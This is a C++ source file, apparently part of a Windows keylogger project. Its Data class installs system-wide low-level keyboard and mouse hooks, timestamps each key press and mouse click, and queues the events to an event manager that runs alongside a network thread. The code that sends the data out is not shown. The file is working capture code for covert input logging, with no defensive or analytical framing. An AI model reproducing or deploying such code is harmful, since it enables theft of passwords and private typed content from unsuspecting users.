#include <ctime>
#include "Data.hpp"

EventManager *Data::_sman = NULL;

Data::Data() : _net(new Network), _man(new EventManager(_net))
{
	_sman = _man;
	_evt = new std::thread(&EventManager::run, _sman);
	_Tnet = new std::thread(&Network::run, _net);
	_kHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbProc, NULL, NULL);
	_mHook = SetWindowsHookEx(WH_MOUSE_LL, MsProc, NULL, NULL);
}

Data::~Data()
{
	_sman->kill();
	_evt->join();
	_Tnet->join();
	delete _evt;
	delete _sman;
	delete _net;
	UnhookWindowsHookEx(_kHook);
	UnhookWindowsHookEx(_mHook);
}

void	getTime(BinaryStruct& s)
{
	SYSTEMTIME	time;

	GetLocalTime(&time);
	s.time.sec = (unsigned int)std::time(NULL);
	s.time.milliSec = time.wMilliseconds;
}

LRESULT CALLBACK Data::KbProc(int code, WPARAM wp, LPARAM lp)
{
	BinaryStruct	nEvent;
	PKBDLLHOOKSTRUCT	pk = (PKBDLLHOOKSTRUCT)lp;

	if (wp == WM_KEYUP)
	{
		if (pk->vkCode != VK_CONTROL && pk->vkCode != VK_RCONTROL &&
			pk->vkCode != VK_SHIFT && pk->vkCode != VK_RSHIFT &&
			pk->vkCode != VK_MENU && pk->vkCode != VK_RMENU)
			return CallNextHookEx(NULL, code, wp, lp);
		nEvent.keyUp = true;
	}
	else
		nEvent.keyUp = false;
	getTime(nEvent);
	nEvent.key = static_cast<Key>(pk->vkCode);
	_sman->addEvent(nEvent);
	return CallNextHookEx(NULL, code, wp, lp);
}

LRESULT CALLBACK Data::MsProc(int code, WPARAM wp, LPARAM lp)
{
	BinaryStruct	nEvent;
	PMSLLHOOKSTRUCT	pm = (PMSLLHOOKSTRUCT)lp;

	if (code == HC_ACTION)
	{
		getTime(nEvent);
		nEvent.mousePos.x = static_cast<short>(pm->pt.x);
		nEvent.mousePos.y = static_cast<short>(pm->pt.y);
		switch (wp)
		{
		case WM_RBUTTONDOWN: { nEvent.key = VK_RBUTTON; _sman->addEvent(nEvent); break; }
		case WM_LBUTTONDOWN: { nEvent.key = VK_LBUTTON; _sman->addEvent(nEvent); break; }
		case WM_MBUTTONDOWN: { nEvent.key = VK_MBUTTON; _sman->addEvent(nEvent); }
		}
	}
	return CallNextHookEx(NULL, code, wp, lp);
}